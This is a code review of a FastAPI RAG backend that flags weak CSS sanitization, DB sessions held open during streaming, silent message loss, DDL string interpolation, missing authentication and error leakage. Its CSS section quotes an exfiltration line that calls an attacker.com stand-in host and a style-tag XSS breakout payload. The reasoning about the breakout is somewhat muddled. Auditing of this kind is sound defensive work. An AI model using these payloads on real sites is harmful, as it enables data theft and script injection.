# Lenny Growth Assistant — Backend Security and Quality Review

This is a FastAPI + PostgreSQL + pgvector RAG application that retrieves transcript chunks via vector similarity and generates responses through Ollama, Anthropic, or OpenAI. The architecture is clean and well-layered: routers, services, skills, and a central agent orchestrator. The concern areas are XSS via incomplete HTML sanitization, SSRF through user-controlled model provider URLs, a streaming endpoint that holds a database session open for the duration of an LLM call (up to 5 minutes), and a SQL injection surface in the ingestion script's index-building step.

**Watch for:** HTML artifact sanitization bypasses `<style>` content re-injection without adequate filtering (confirmed). The streaming SSE path holds a database session and transaction open for the full duration of LLM generation, risking pool exhaustion under load (confirmed). The `ingest_transcripts.py` script interpolates an integer directly into a DDL statement — low risk since it's derived from `count(*)`, but it breaks the parameterized-query discipline (confirmed).

**Verdict**: NEEDS_CHANGES

## High-level view

The HTML sanitization pipeline strips dangerous tags via bleach but then re-injects the raw `<style>` block from the *original unsanitized* HTML. The regex-based CSS cleaning only targets `expression()` and `url(javascript:)` but misses other CSS-based exfiltration and injection vectors (`@import`, `-moz-binding`, `behavior:`, etc.), so a crafted LLM output or a user who manipulates the prompt could produce XSS-capable artifacts stored server-side.

The SSE streaming path in `messages.py` yields tokens while keeping the SQLAlchemy session open for the entire response duration (up to the 300-second LLM timeout). With only 5+10 connections in the pool, a handful of concurrent streaming requests can starve the pool and block all other database operations.

The `OLLAMA_BASE_URL` is user-configurable only at deploy time (env var), but the health and config endpoints issue HTTP requests to it. If an operator misconfigures it to an internal service, the application becomes an SSRF relay. The user cannot change the base URL at runtime, so this is an operational risk rather than a live exploit — but it's worth documenting.

The ingestion script's IVFFlat index rebuild interpolates `lists` (an integer derived from `count(*)`) into raw SQL. It's not exploitable in practice because the value comes from a scalar aggregate, but it sets a bad precedent and would be trivially fixed with an f-string-free approach or at minimum a type assertion.

The database session dependency auto-commits on success, which means the streaming generator's `flush()` calls are later committed by FastAPI's dependency cleanup — but if the generator is cancelled mid-stream (client disconnect), the session rolls back and the user's message is lost with no indication. This is a data-loss race under normal usage.

<summary>Issues (7)</summary>

1. **CSS injection in artifact sanitization** — The `_sanitize_html` method re-injects the `<style>` block from the original unsanitized HTML with only `expression()` and `url(javascript:)` stripped. Add a CSS sanitizer (e.g., `bleach-css` or a CSS parser allowlist) or strip `<style>` entirely and rely on inline styles only.
2. **Streaming SSE holds DB session for LLM duration** — The `_stream_response` generator keeps the database session (and a pool connection) open for up to 300 seconds. Separate the DB writes (save user message, save assistant message) from the streaming phase, or use a short-lived session for each DB operation.
3. **Client disconnect loses user message** — If the SSE client disconnects mid-stream, the generator stops, the `get_db` dependency rolls back, and the already-flushed user message is discarded without error. Commit the user message before starting the stream.
4. **SQL interpolation in ingestion index build** — `f"...WITH (lists = {lists})"` in `ingest_transcripts.py` directly interpolates a value into DDL. Assert the type or use a safe DDL builder to maintain parameterized-query discipline.
5. **No authentication or rate limiting** — All endpoints are unauthenticated. Any client can create sessions, invoke LLM calls (which cost money on cloud providers), and generate artifacts. Add at minimum an API key or session token, and rate-limit the message/artifact endpoints.
6. **Error message leaks in SSE stream** — The streaming error handler sends `str(e)` directly to the client, which can leak internal details (stack frames, DB connection strings, file paths) depending on the exception type.
7. **OpenAI model name hardcoded, ignores session** — `_generate_openai` and `_stream_openai` always use `"gpt-4o"` regardless of `self.model`, so switching a session to an OpenAI model other than gpt-4o has no effect.

## CSS injection via `<style>` re-injection in artifact sanitization

In `artifact_skill.py`, after bleach strips all tags not in the allowlist, the code searches the *original unsanitized HTML* for a `<style>` block and prepends it to the sanitized output:

```python
style_match = re.search(r"<style[^>]*>(.*?)</style>", html, re.DOTALL | re.IGNORECASE)
if style_match:
    style_content = style_match.group(1)
    style_content = re.sub(r"expression\s*\(", "", style_content, flags=re.IGNORECASE)
    style_content = re.sub(r"url\s*\(\s*['\"]?javascript:", "url(", style_content, flags=re.IGNORECASE)
    sanitized = f"<style>{style_content}</style>\n{sanitized}"
```

The regex cleanup only targets two specific attack patterns. Missing from the filter:

- `@import url("https://attacker.com/exfil?data=...")` — data exfiltration via CSS
- `behavior: url(...)` (IE legacy but still relevant in some webviews)
- `-moz-binding: url(...)` (Firefox legacy)
- `</style><script>alert(1)</script><style>` — a trivially-crafted payload that breaks out of the style tag because the regex uses a non-greedy `(.*?)` match, but if the LLM output includes multiple `</style>` sequences, the first match's group content could stop before the injected script, and the leftover text after re-injection is no longer sanitized by bleach.

The last vector is the most concrete: if `html` contains `<style>safe{}</style><script>xss</script><style>.more{}</style>`, the regex captures `safe{}` (the first match), which is benign — but the *second* `<style>` block (which may contain the payload) isn't captured at all and was already stripped by bleach. However, a payload like `<style>body{} </style ><script>xss</script>` where the closing tag is slightly malformed could bypass the regex boundary. More robustly, the `@import` vector needs no tag escape and works within the style content directly.

**Confidence: confirmed** for the `@import` exfiltration path. The tag-breakout depends on edge-case regex behavior but is plausible.

**Fix:** Use a dedicated CSS sanitizer that parses the stylesheet and allowlists only known-safe properties and values, or remove the `<style>` re-injection entirely and accept only inline `style` attributes (which bleach already handles via the `ALLOWED_STYLES` list).

## Database session lifetime during SSE streaming

In `messages.py`, `_stream_response` is an async generator that is yielded from within the `get_db` dependency's context manager. The lifecycle:

1. `get_db` opens a session and yields it.
2. The route handler returns a `StreamingResponse` wrapping `_stream_response(...)`.
3. FastAPI streams the generator's output to the client.
4. The generator awaits `agent.process_message_stream()`, which calls the LLM (up to 300s timeout).
5. After streaming completes, the generator does `db.flush()` to save the assistant message.
6. The generator exits, control returns to `get_db`, which commits and closes.

During step 4, one connection from the pool (max 15 = pool_size 5 + max_overflow 10) is held idle. With 15 concurrent streaming users, the pool is exhausted and all other requests (session CRUD, health checks, artifact generation) will block waiting for a connection.

**Confidence: confirmed** — the session lifecycle is visible in the code path.

**Fix:** Don't pass the `db` session into the streaming generator. Instead:
- Open a short-lived session to save the user message and commit it.
- Stream LLM tokens without holding a DB connection.
- Open a new short-lived session after streaming completes to save the assistant message.

## Client disconnect causes silent data loss

If the client closes the SSE connection mid-stream, Starlette cancels the async generator. The user message was `flush()`-ed but not committed — it exists only within the transaction. When `get_db`'s `finally` block runs, it calls `session.close()`, and since the exception path triggers `rollback()`, the user message vanishes.

The user sees their message in the UI (optimistically rendered) but on reload it's gone. No error is logged for this case because the `except` in `_stream_response` only catches exceptions from the LLM call, not `asyncio.CancelledError` from generator cleanup.

**Confidence: confirmed** — the rollback-on-exception behavior in `get_db` and the flush-without-commit in the generator are both visible in code.

## Error leakage in SSE stream

```python
except Exception as e:
    logger.error("message.stream_error", error=str(e))
    yield f"data: {json.dumps({'type': 'error', 'code': 'STREAM_ERROR', 'message': str(e)})}\n\n"
    return
```

`str(e)` for an `httpx.ConnectError` includes the URL being connected to (which could reveal internal network topology). For a `sqlalchemy` exception it could include table names or connection parameters. The unhandled-exception handler in `main.py` already does the right thing (generic message), but this streaming path bypasses it.

**Confidence: confirmed.**

## No authentication or rate limiting

Every endpoint is open. The `POST /api/v1/sessions/{id}/messages` endpoint invokes cloud LLM calls (Anthropic, OpenAI) that cost real money per token. There is no API key, bearer token, or session cookie requirement. There is also no rate limiter, so a single client can exhaust the cloud API budget or the DB pool.

The CORS configuration restricts browser-origin requests, but that only protects against cross-origin browser calls — it does nothing against direct HTTP clients (curl, scripts, bots).

**Confidence: confirmed.**

## OpenAI model name hardcoded

In `llm_service.py`, both `_generate_openai` and `_stream_openai` hardcode `"model": "gpt-4o"` in the request body regardless of `self.model`. The session's `model_name` is ignored for OpenAI:

```python
json={
    "model": "gpt-4o",  # should be self.model
    ...
}
```

Similarly, the `LLMResponse` returned from `_generate_openai` sets `model="gpt-4o"` instead of `self.model`.

**Confidence: confirmed.**

## Ingestion script SQL interpolation

```python
await conn.execute(
    text(
        f"CREATE INDEX idx_transcript_chunks_embedding "
        f"ON transcript_chunks USING ivfflat (embedding vector_cosine_ops) "
        f"WITH (lists = {lists})"
    )
)
```

`lists` is an `int` derived from `int(row_count ** 0.5)` where `row_count` comes from a `count(*)` query. This is not exploitable in practice, but it violates the parameterized-query principle. If the code were ever refactored to accept `lists` from user input (e.g., a CLI flag), it would become a SQL injection vector.

**Confidence: confirmed** (not exploitable today, but a hygiene issue).
